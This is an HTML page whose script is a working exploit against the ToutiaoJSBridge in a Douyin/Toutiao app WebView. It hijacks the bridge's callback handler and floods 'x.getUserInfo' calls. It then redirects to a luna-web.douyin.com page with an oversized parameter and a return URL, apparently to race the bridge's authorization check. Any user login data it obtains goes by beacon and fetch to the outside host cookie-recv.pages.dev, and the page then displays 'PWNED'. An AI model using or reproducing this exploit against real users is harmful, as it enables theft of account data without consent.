<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>loading</title></head>
<body>
<h3 id="st">racing...</h3>
<script>

var EXFIL = 'https://cookie-recv.pages.dev/';
var BACK = location.href.split('?')[0] + '?grab=1';

function sendBeacon(tag, data) {
    new Image().src = EXFIL + '?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(data).substring(0, 3500));
    try { fetch(EXFIL + '?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(data).substring(0, 3500)), {mode: 'no-cors', keepalive: true}); } catch (e) {}
}

ToutiaoJSBridge._handleMessageFromToutiao = function (msg) {
    if (msg && msg.__msg_type === 'callback') {
        var s = JSON.stringify(msg);
        if (s.indexOf('not authorized') === -1 && s.indexOf('not found') === -1) {
            sendBeacon('login_data', s);
            document.getElementById('st').textContent = 'PWNED';
            document.title = 'PWNED';
        }
    }
};

var SENT = 0;
function pump() {
    try {
        ToutiaoJSBridge.invokeMethod(JSON.stringify({
            func: 'x.getUserInfo', params: {},
            __callback_id: 'g' + (SENT % 5),
            __msg_type: 'call', __timestamp: Date.now()
        }));
        SENT++;
    } catch (e) {}
}

if (!/[?&]grab=1/.test(location.search)) {
    for (var i = 0; i < 100; i++) pump();
    setInterval(pump, 0);
    setTimeout(function () {
        var big = new Array(20000).join('x');
        location.href = 'https://luna-web.douyin.com/teen-mode-agreement/index.html?cb=' + Math.random() + '&p=' + big + '&returnUrl=' + encodeURIComponent(BACK);
    }, 120);
} else {
    document.getElementById('st').textContent = 'back - waiting...';
    ToutiaoJSBridge._handleMessageFromToutiao = function (msg) {
        if (msg && msg.__msg_type === 'callback') {
            var s = JSON.stringify(msg);
            if (s.indexOf('not authorized') === -1 && s.indexOf('not found') === -1) {
                sendBeacon('back_login_data', s);
                document.getElementById('st').textContent = 'PWNED';
                document.title = 'PWNED';
            }
        }
    };
    for (var i = 0; i < 30; i++) pump();
    setTimeout(function () {
        sendBeacon('back_status', document.title);
    }, 3000);
}
</script>
</body>
</html>
